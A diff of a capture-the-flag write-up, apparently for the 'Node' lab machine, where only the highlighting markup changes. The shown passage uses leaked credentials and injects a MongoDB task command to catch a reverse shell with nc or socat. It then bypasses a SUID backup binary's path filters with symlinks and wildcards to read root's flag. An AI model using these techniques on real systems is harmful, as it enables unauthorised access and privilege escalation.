 
 <p>Let&rsquo;s try those credentials with ssh:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">ssh mark@10.10.10.58
-</span><span class="go">Password: 5AYRft73VtFpc84k
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">mark@node:~$
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ssh mark@10.10.10.58
+</span></span></span><span class="line"><span class="cl"><span class="go">Password: 5AYRft73VtFpc84k
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mark@node:~$
+</span></span></span></code></pre></div></div></p>
 
 <h1 id="getting-tom-user">Getting tom user</h1>
 
 <p>Let&rsquo;s find if user tom is running anything:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>ps aux <span class="p">|</span> grep tom
-<span class="go">tom       1213  3.2  9.0 1055196 68812 ?       Ssl  05:02   8:20 /usr/bin/node /var/www/myplace/app.js
-</span><span class="go">tom       1220  0.0  4.9 1008568 37896 ?       Ssl  05:02   0:04 /usr/bin/node /var/scheduler/app.js
-</span><span class="go">mark     18678  0.0  0.1  14228   940 pts/4    S+   09:21   0:00 grep --color=auto tom
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ps aux <span class="p">|</span> grep tom
+</span></span><span class="line"><span class="cl"><span class="go">tom       1213  3.2  9.0 1055196 68812 ?       Ssl  05:02   8:20 /usr/bin/node /var/www/myplace/app.js
+</span></span></span><span class="line"><span class="cl"><span class="go">tom       1220  0.0  4.9 1008568 37896 ?       Ssl  05:02   0:04 /usr/bin/node /var/scheduler/app.js
+</span></span></span><span class="line"><span class="cl"><span class="go">mark     18678  0.0  0.1  14228   940 pts/4    S+   09:21   0:00 grep --color=auto tom
+</span></span></span></code></pre></div></div></p>
 
 <p>The file /var/scheduler/app.js seems interesting:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat /var/scheduler/app.js
-<span class="go">const exec        = require(&#39;child_process&#39;).exec;
-</span><span class="go">const MongoClient = require(&#39;mongodb&#39;).MongoClient;
-</span><span class="go">const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
-</span><span class="go">const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;;
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">MongoClient.connect(url, function(error, db) {
-</span><span class="go">  if (error || !db) {
-</span><span class="go">    console.log(&#39;[!] Failed to connect to mongodb&#39;);
-</span><span class="go">    return;
-</span><span class="go">  }
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">  setInterval(function () {
-</span><span class="go">    db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) {
-</span><span class="go">      if (!error &amp;&amp; docs) {
-</span><span class="go">        docs.forEach(function (doc) {
-</span><span class="go">          if (doc) {
-</span><span class="go">            console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;);
-</span><span class="go">            exec(doc.cmd);
-</span><span class="go">            db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) });
-</span><span class="go">          }
-</span><span class="go">        });
-</span><span class="go">      }
-</span><span class="go">      else if (error) {
-</span><span class="go">        console.log(&#39;Something went wrong: &#39; + error);
-</span><span class="go">      }
-</span><span class="go">    });
-</span><span class="go">  }, 30000);
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">});
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /var/scheduler/app.js
+</span></span><span class="line"><span class="cl"><span class="go">const exec        = require(&#39;child_process&#39;).exec;
+</span></span></span><span class="line"><span class="cl"><span class="go">const MongoClient = require(&#39;mongodb&#39;).MongoClient;
+</span></span></span><span class="line"><span class="cl"><span class="go">const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
+</span></span></span><span class="line"><span class="cl"><span class="go">const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">MongoClient.connect(url, function(error, db) {
+</span></span></span><span class="line"><span class="cl"><span class="go">  if (error || !db) {
+</span></span></span><span class="line"><span class="cl"><span class="go">    console.log(&#39;[!] Failed to connect to mongodb&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="go">    return;
+</span></span></span><span class="line"><span class="cl"><span class="go">  }
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  setInterval(function () {
+</span></span></span><span class="line"><span class="cl"><span class="go">    db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) {
+</span></span></span><span class="line"><span class="cl"><span class="go">      if (!error &amp;&amp; docs) {
+</span></span></span><span class="line"><span class="cl"><span class="go">        docs.forEach(function (doc) {
+</span></span></span><span class="line"><span class="cl"><span class="go">          if (doc) {
+</span></span></span><span class="line"><span class="cl"><span class="go">            console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="go">            exec(doc.cmd);
+</span></span></span><span class="line"><span class="cl"><span class="go">            db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) });
+</span></span></span><span class="line"><span class="cl"><span class="go">          }
+</span></span></span><span class="line"><span class="cl"><span class="go">        });
+</span></span></span><span class="line"><span class="cl"><span class="go">      }
+</span></span></span><span class="line"><span class="cl"><span class="go">      else if (error) {
+</span></span></span><span class="line"><span class="cl"><span class="go">        console.log(&#39;Something went wrong: &#39; + error);
+</span></span></span><span class="line"><span class="cl"><span class="go">      }
+</span></span></span><span class="line"><span class="cl"><span class="go">    });
+</span></span></span><span class="line"><span class="cl"><span class="go">  }, 30000);
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">});
+</span></span></span></code></pre></div></div></p>
 
 <p>In MongoDB, databases hold collections of documents i.e. MongoDB stores documents in collections. Collections are analogous to tables in relational databases. We see that /var/scheduler/app.js connects to a mondodb database named &ldquo;scheduler&rdquo;, searches for documents in a collection named &ldquo;tasks&rdquo; and executes their &ldquo;cmd&rdquo; field. Let&rsquo;s connect to mongodb and insert a new document in the tasks collection. The command we want to be executed by user tom will be in the &ldquo;cmd&rdquo; field.
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">mark@node: mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
-</span><span class="go">mark@node: &gt; db.tasks.insertOne({cmd:&#34;/usr/bin/python2 /dev/shm/.a/shell.py&#34;});
-</span><span class="go">{
-</span><span class="go">    &#34;acknowledged&#34; : true,
-</span><span class="go">    &#34;insertedId&#34; : ObjectId(&#34;5a97cc23089575233c6082cc&#34;)
-</span><span class="go">}
-</span><span class="go"></span><span class="gp">&gt;
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mark@node: mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
+</span></span></span><span class="line"><span class="cl"><span class="go">mark@node: &gt; db.tasks.insertOne({cmd:&#34;/usr/bin/python2 /dev/shm/.a/shell.py&#34;});
+</span></span></span><span class="line"><span class="cl"><span class="go">{
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#34;acknowledged&#34; : true,
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#34;insertedId&#34; : ObjectId(&#34;5a97cc23089575233c6082cc&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="go">}
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">&gt;</span>
+</span></span></code></pre></div></div></p>
 
 <p>On your side:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>socat file:<span class="sb">`</span>tty<span class="sb">`</span>,echo<span class="o">=</span>0,raw tcp4-listen:60000
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> socat file:<span class="sb">`</span>tty<span class="sb">`</span>,echo<span class="o">=</span>0,raw tcp4-listen:60000
+</span></span></code></pre></div></div></p>
 
 <p>or simply:</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>nc -lvp <span class="m">60000</span>
-<span class="go">nc: listening on :: 60000 ...
-</span><span class="go">nc: connect to 10.10.15.154 60000 from 10.10.10.58 (10.10.10.58) 50488 [50488]
-</span><span class="go">nc: using stream socket
-</span><span class="go">To run a command as administrator (user &#34;root&#34;), use &#34;sudo &lt;command&gt;&#34;.
-</span><span class="go">See &#34;man sudo_root&#34; for details.
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc -lvp <span class="m">60000</span>
+</span></span><span class="line"><span class="cl"><span class="go">nc: listening on :: 60000 ...
+</span></span></span><span class="line"><span class="cl"><span class="go">nc: connect to 10.10.15.154 60000 from 10.10.10.58 (10.10.10.58) 50488 [50488]
+</span></span></span><span class="line"><span class="cl"><span class="go">nc: using stream socket
+</span></span></span><span class="line"><span class="cl"><span class="go">To run a command as administrator (user &#34;root&#34;), use &#34;sudo &lt;command&gt;&#34;.
+</span></span></span><span class="line"><span class="cl"><span class="go">See &#34;man sudo_root&#34; for details.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$
+</span></span></span></code></pre></div></div>
 
 <h1 id="getting-root">Getting root</h1>
 
 <p>Let&rsquo;s examine /var/www/myplace/app.js:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ cat /var/www/myplace/app.js | grep backup
-</span><span class="go">cat /var/www/myplace/app.js | grep backup
-</span><span class="go">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
-</span><span class="go">  app.get(&#39;/api/admin/backup&#39;, function (req, res) {
-</span><span class="go">      var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);
-</span><span class="go">      var backup = &#39;&#39;;
-</span><span class="go">        res.header(&#34;Content-Disposition&#34;, &#34;attachment; filename=myplace.backup&#34;);
-</span><span class="go">        res.send(backup);
-</span><span class="go">        backup += chunk;
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ cat /var/www/myplace/app.js | grep backup
+</span></span></span><span class="line"><span class="cl"><span class="go">cat /var/www/myplace/app.js | grep backup
+</span></span></span><span class="line"><span class="cl"><span class="go">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="go">  app.get(&#39;/api/admin/backup&#39;, function (req, res) {
+</span></span></span><span class="line"><span class="cl"><span class="go">      var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);
+</span></span></span><span class="line"><span class="cl"><span class="go">      var backup = &#39;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="go">        res.header(&#34;Content-Disposition&#34;, &#34;attachment; filename=myplace.backup&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="go">        res.send(backup);
+</span></span></span><span class="line"><span class="cl"><span class="go">        backup += chunk;
+</span></span></span></code></pre></div></div></p>
 
 <p>Note those lines:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
-</span><span class="go">...
-</span><span class="go">var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s check the permissions of /usr/local/bin/backup:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ ls -al /usr/local/bin/backup
-</span><span class="go">ls -al /usr/local/bin/backup
-</span><span class="go">-rwsr-xr-- 1 root admin 16484 Sep  3 11:30 /usr/local/bin/backup
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ ls -al /usr/local/bin/backup
+</span></span></span><span class="line"><span class="cl"><span class="go">ls -al /usr/local/bin/backup
+</span></span></span><span class="line"><span class="cl"><span class="go">-rwsr-xr-- 1 root admin 16484 Sep  3 11:30 /usr/local/bin/backup
+</span></span></span></code></pre></div></div></p>
 
 <p>Interesting. It&rsquo;s a root-owned SUID executable! I bet we can find many ways to exploit this backup app. Let&rsquo;s explore it using ltrace:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ ltrace /usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /tmp/a 
-</span><span class="go">__libc_start_main(0x80489fd, 4, 0xff84f0a4, 0x80492c0 &lt;unfinished ...&gt;
-</span><span class="go">geteuid()                                                              = 1000
-</span><span class="go">setuid(1000)                                                           = 0
-</span><span class="go">strcmp(&#34;-q&#34;, &#34;-q&#34;)                                                     = 0
-</span><span class="go">strncpy(0xff84ef68, &#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., 100)        = 0xff84ef68
-</span><span class="go">strcpy(0xff84ef51, &#34;/&#34;)                                                = 0xff84ef51
-</span><span class="go">strcpy(0xff84ef5d, &#34;/&#34;)                                                = 0xff84ef5d
-</span><span class="go">...
-</span><span class="go">strcat(&#34;/etc/myplace/key&#34;, &#34;s&#34;)                                        = &#34;/etc/myplace/keys&#34;
-</span><span class="go">...
-</span><span class="go">fopen(&#34;/etc/myplace/keys&#34;, &#34;r&#34;)                                        = 0x9344008
-</span><span class="go">fgets(&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;..., 1000, 0x9344008)          = 0xff84eaff
-</span><span class="go">strcspn(&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;..., &#34;\n&#34;)                   = 64
-</span><span class="go">strcmp(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;...) = -1
-</span><span class="go">fgets(&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;..., 1000, 0x9344008)          = 0xff84eaff
-</span><span class="go">strcspn(&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;..., &#34;\n&#34;)                   = 64
-</span><span class="go">strcmp(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;45fac180e9eee72f4fd2d9386ea7033e&#34;...) = -1
-</span><span class="go">fgets(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., 1000, 0x9344008)          = 0xff84eaff
-</span><span class="go">strcspn(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;\n&#34;)                   = 64
-</span><span class="go">strcmp(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;3de811f4ab2b7543eaf45df611c2dd25&#34;...) = 0
-</span><span class="go">fgets(nil, 1000, 0x9344008)                                            = 0
-</span><span class="go">strstr(&#34;/tmp/a&#34;, &#34;..&#34;)                                             = nil
-</span><span class="go">strstr(&#34;/tmp/a&#34;, &#34;/root&#34;)                                          = nil
-</span><span class="go">strchr(&#34;/tmp/a&#34;, &#39;;&#39;)                                              = nil
-</span><span class="go">strchr(&#34;/tmp/a&#34;, &#39;&amp;&#39;)                                              = nil
-</span><span class="go">strchr(&#34;/tmp/a&#34;, &#39;`&#39;)                                              = nil
-</span><span class="go">strchr(&#34;/tmp/a&#34;, &#39;$&#39;)                                              = nil
-</span><span class="go">strchr(&#34;/tmp/a&#34;, &#39;|&#39;)   q                                           = nil
-</span><span class="go">strstr(&#34;/tmp/a&#34;, &#34;//&#34;)                                             = nil
-</span><span class="go">strcmp(&#34;/tmp/a&#34;, &#34;/&#34;)                                              = 1
-</span><span class="go">strstr(&#34;/tmp/a&#34;, &#34;/etc&#34;)                                           = nil
-</span><span class="go">strcpy(0xff84e90b, &#34;/tmp/a&#34;)                                       = 0xff84e90b
-</span><span class="go">getpid()                                                               = 25982
-</span><span class="go">time(0)                                                                = 1508024709
-</span><span class="go">clock(0, 0, 0, 0)                                                      = 624
-</span><span class="go">srand(0x4cfc17f4, 0x8bb32348, 0x4cfc17f4, 0x804918c)                   = 0
-</span><span class="go">rand(0, 0, 0, 0)                                                       = 0x7968d049
-</span><span class="go">sprintf(&#34;/tmp/.backup_2036912201&#34;, &#34;/tmp/.backup_%i&#34;, 2036912201)      = 23
-</span><span class="go">sprintf(&#34;/usr/bin/zip -r -P magicword /tm&#34;..., &#34;/usr/bin/zip -r -P magicword %s &#34;..., &#34;/tmp/.backup_2036912201&#34;, &#34;/tmp/a&#34;) = 75
-</span><span class="go">system(&#34;/usr/bin/zip -r -P magicword /tm&#34;... &lt;no return ...&gt;
-</span><span class="go">--- SIGCHLD (Child exited) ---
-</span><span class="go">&lt;... system resumed&gt; )                                                 = 0
-</span><span class="go">access(&#34;/tmp/.backup_2036912201&#34;, 0)                                   = 0
-</span><span class="go">sprintf(&#34;/usr/bin/base64 -w0 /tmp/.backup&#34;..., &#34;/usr/bin/base64 -w0 %s&#34;, &#34;/tmp/.backup_2036912201&#34;) = 43
-</span><span class="go">system(&#34;/usr/bin/base64 -w0 /tmp/.backup&#34;...UEsDBBQACQAIAH&lt;no return ...&gt;
-</span><span class="go">--- SIGCHLD (Child exited) ---
-</span><span class="go">&lt;... system resumed&gt; )                                                 = 0
-</span><span class="go">remove(&#34;/tmp/.backup_2036912201&#34;)                                      = 0
-</span><span class="go">fclose(0x9344008)
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ ltrace /usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /tmp/a 
+</span></span></span><span class="line"><span class="cl"><span class="go">__libc_start_main(0x80489fd, 4, 0xff84f0a4, 0x80492c0 &lt;unfinished ...&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">geteuid()                                                              = 1000
+</span></span></span><span class="line"><span class="cl"><span class="go">setuid(1000)                                                           = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp(&#34;-q&#34;, &#34;-q&#34;)                                                     = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">strncpy(0xff84ef68, &#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., 100)        = 0xff84ef68
+</span></span></span><span class="line"><span class="cl"><span class="go">strcpy(0xff84ef51, &#34;/&#34;)                                                = 0xff84ef51
+</span></span></span><span class="line"><span class="cl"><span class="go">strcpy(0xff84ef5d, &#34;/&#34;)                                                = 0xff84ef5d
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">strcat(&#34;/etc/myplace/key&#34;, &#34;s&#34;)                                        = &#34;/etc/myplace/keys&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">fopen(&#34;/etc/myplace/keys&#34;, &#34;r&#34;)                                        = 0x9344008
+</span></span></span><span class="line"><span class="cl"><span class="go">fgets(&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;..., 1000, 0x9344008)          = 0xff84eaff
+</span></span></span><span class="line"><span class="cl"><span class="go">strcspn(&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;..., &#34;\n&#34;)                   = 64
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;...) = -1
+</span></span></span><span class="line"><span class="cl"><span class="go">fgets(&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;..., 1000, 0x9344008)          = 0xff84eaff
+</span></span></span><span class="line"><span class="cl"><span class="go">strcspn(&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;..., &#34;\n&#34;)                   = 64
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;45fac180e9eee72f4fd2d9386ea7033e&#34;...) = -1
+</span></span></span><span class="line"><span class="cl"><span class="go">fgets(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., 1000, 0x9344008)          = 0xff84eaff
+</span></span></span><span class="line"><span class="cl"><span class="go">strcspn(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;\n&#34;)                   = 64
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp(&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;..., &#34;3de811f4ab2b7543eaf45df611c2dd25&#34;...) = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">fgets(nil, 1000, 0x9344008)                                            = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">strstr(&#34;/tmp/a&#34;, &#34;..&#34;)                                             = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strstr(&#34;/tmp/a&#34;, &#34;/root&#34;)                                          = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strchr(&#34;/tmp/a&#34;, &#39;;&#39;)                                              = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strchr(&#34;/tmp/a&#34;, &#39;&amp;&#39;)                                              = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strchr(&#34;/tmp/a&#34;, &#39;`&#39;)                                              = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strchr(&#34;/tmp/a&#34;, &#39;$&#39;)                                              = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strchr(&#34;/tmp/a&#34;, &#39;|&#39;)   q                                           = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strstr(&#34;/tmp/a&#34;, &#34;//&#34;)                                             = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp(&#34;/tmp/a&#34;, &#34;/&#34;)                                              = 1
+</span></span></span><span class="line"><span class="cl"><span class="go">strstr(&#34;/tmp/a&#34;, &#34;/etc&#34;)                                           = nil
+</span></span></span><span class="line"><span class="cl"><span class="go">strcpy(0xff84e90b, &#34;/tmp/a&#34;)                                       = 0xff84e90b
+</span></span></span><span class="line"><span class="cl"><span class="go">getpid()                                                               = 25982
+</span></span></span><span class="line"><span class="cl"><span class="go">time(0)                                                                = 1508024709
+</span></span></span><span class="line"><span class="cl"><span class="go">clock(0, 0, 0, 0)                                                      = 624
+</span></span></span><span class="line"><span class="cl"><span class="go">srand(0x4cfc17f4, 0x8bb32348, 0x4cfc17f4, 0x804918c)                   = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">rand(0, 0, 0, 0)                                                       = 0x7968d049
+</span></span></span><span class="line"><span class="cl"><span class="go">sprintf(&#34;/tmp/.backup_2036912201&#34;, &#34;/tmp/.backup_%i&#34;, 2036912201)      = 23
+</span></span></span><span class="line"><span class="cl"><span class="go">sprintf(&#34;/usr/bin/zip -r -P magicword /tm&#34;..., &#34;/usr/bin/zip -r -P magicword %s &#34;..., &#34;/tmp/.backup_2036912201&#34;, &#34;/tmp/a&#34;) = 75
+</span></span></span><span class="line"><span class="cl"><span class="go">system(&#34;/usr/bin/zip -r -P magicword /tm&#34;... &lt;no return ...&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">--- SIGCHLD (Child exited) ---
+</span></span></span><span class="line"><span class="cl"><span class="go">&lt;... system resumed&gt; )                                                 = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">access(&#34;/tmp/.backup_2036912201&#34;, 0)                                   = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">sprintf(&#34;/usr/bin/base64 -w0 /tmp/.backup&#34;..., &#34;/usr/bin/base64 -w0 %s&#34;, &#34;/tmp/.backup_2036912201&#34;) = 43
+</span></span></span><span class="line"><span class="cl"><span class="go">system(&#34;/usr/bin/base64 -w0 /tmp/.backup&#34;...UEsDBBQACQAIAH&lt;no return ...&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">--- SIGCHLD (Child exited) ---
+</span></span></span><span class="line"><span class="cl"><span class="go">&lt;... system resumed&gt; )                                                 = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">remove(&#34;/tmp/.backup_2036912201&#34;)                                      = 0
+</span></span></span><span class="line"><span class="cl"><span class="go">fclose(0x9344008)
+</span></span></span></code></pre></div></div></p>
 
 <p>We see that the directory is zipped using &ldquo;magicword&rdquo; as password and then the zip file is getting base64-encoded. Moreover, we notice that there are many filters in place that use strchr() or strstr(). Let&rsquo;s see if we can bypass them.</p>
 
 <h2 id="1-using-symbolic-links">1. Using symbolic links:</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ mkdir -p /dev/shm/test1/test2
-</span><span class="go">tom@node:/$ ln -s /root/root.txt /dev/shm/test1/test2/r
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /dev/shm/test1/test2/r | base64 -d &gt; /dev/shm/.a/mybackup.zip
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
-</span><span class="go">password: magicword
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ mkdir -p /dev/shm/test1/test2
+</span></span></span><span class="line"><span class="cl"><span class="go">tom@node:/$ ln -s /root/root.txt /dev/shm/test1/test2/r
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /dev/shm/test1/test2/r | base64 -d &gt; /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go">password: magicword
+</span></span></span></code></pre></div></div>
 
 <h2 id="2-using-special-characters">2. Using special characters:</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">Backslash escape:
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
-</span><span class="go">password: magicword
-</span><span class="go">Wildcard expansion:
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/r???/r???.txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ unzip /dev/shm/.a/mybackup.zip
-</span><span class="go">password: magicword
-</span><span class="go">Brace expansion:
-</span><span class="go"></span><span class="err">
